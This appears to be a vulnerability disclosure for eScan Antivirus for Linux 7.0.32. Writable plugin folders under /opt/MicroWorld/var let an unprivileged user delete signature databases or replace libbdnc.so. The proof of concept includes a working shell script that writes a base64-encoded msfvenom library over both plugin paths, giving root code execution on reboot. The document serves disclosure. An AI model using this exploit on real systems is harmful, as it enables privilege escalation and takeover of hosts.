# Basic info
- Environment: xubuntu 24.04.1 AMD 64
- Product: Escan Antivirus for Linux, version 7.0.32 updated to Dec 25th, 2024
- Download link: `https://www.microworldsystems.com/download/linux/soho/deb/escan-antivirus-wks.amd64.deb`

# Description and impact
Installation process from `.deb` file of Escan Antivirus on Linux has writable database folders by default. These writable folders have engine's databases. Unprivileged user can:
- Delete signatures database, causing **Deinal of Service** attack.
- Overwrite engine libraries with malicious file, causing **Privilege Escalation** attack form unprivileged user.

# Root-cause
- By default, Escan Antivirus has writable folders at `/opt/MicroWorld/var/`. Of all writable folders, `bdplugins1` and `bdplugins2` are having database of **BitDefender's engine**. `bdplugins1` is used by Escan's GUI and `bdplugins2` is used by Escan CLi
![image](https://github.com/user-attachments/assets/8a64fef4-ecdb-4b22-a120-b3b3c162db35)
- `libbdnc.so` is loaded by scan engine (either CLI or GUI)

Unprivileged threat actor can write malicious ELF library to `bdplugins1/libbdnc.so` and `bdplugins2/libbdnc.so`. Malicious code is executed when:
- Any user starts a cli scan with command `escan` or start escan GUi with `escangui`. Malicious code will have privilege of user that started escan.
- System reboots. System service executes malicious code as `root`.

# Proof-of-Concept
1. Attacker create a malicious shared library file. To make a simple demo, I used *metasploit-framework* to create shared library that executes shell command `id > /tmp/mal_id` which writes result of `id` to `/tmp/mal_id`. A base64 text of output file is used to make exploit script.
2. Attacker run this bash script on vulnerable machine
```
#!/bin/sh

# msfvenom -f elf-so -p linux/x64/exec CMD="id > /tmp/mal_id" -o hehe.so

mal_file="f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAkgEAAAAAAABAAAAAAAAAALAAAAAAAAAAAAAAAEAAOAACAEAAAgABAAEAAAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxwEAAAAAAAD8AQAAAAAAAAAQAAAAAAAAAgAAAAcAAAAwAQAAAAAAADABAAAAAAAAMAEAAAAAAABgAAAAAAAAAGAAAAAAAAAAABAAAAAAAAABAAAABgAAAAAAAAAAAAAAMAEAAAAAAAAwAQAAAAAAAGAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAcAAAAAAAAAAAAAAAMAAAAAAAAAAAAAAJABAAAAAAAAkAEAAAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAkgEAAAAAAAAFAAAAAAAAAJABAAAAAAAABgAAAAAAAACQAQAAAAAAAAoAAAAAAAAAAAAAAAAAAAALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASLgvYmluL3NoAJlQVF9SZmgtY1ReUugRAAAAaWQgPiAvdG1wL21hbF9pZABWV1ReajtYDwU="

# plugin1 -> used by Gui, plugin2 -> used by cli
write_path="/opt/MicroWorld/var/bdplugins1/Plugins/libbdnc.so"
write_path_2="/opt/MicroWorld/var/bdplugins2/Plugins/libbdnc.so"

echo $mal_file | base64 -d > $write_path
echo $mal_file | base64 -d > $write_path_2
```
![{B88F0DD2-939A-4BA2-9ECD-3D33E51B7F29}](https://github.com/user-attachments/assets/4f5dcbad-4a35-4d59-ae59-fcff0e09b7fb)

3. Reboot system. Malicious code is executed

![image](https://github.com/user-attachments/assets/e396ebec-9925-4fea-9822-9496e89c7ddc)

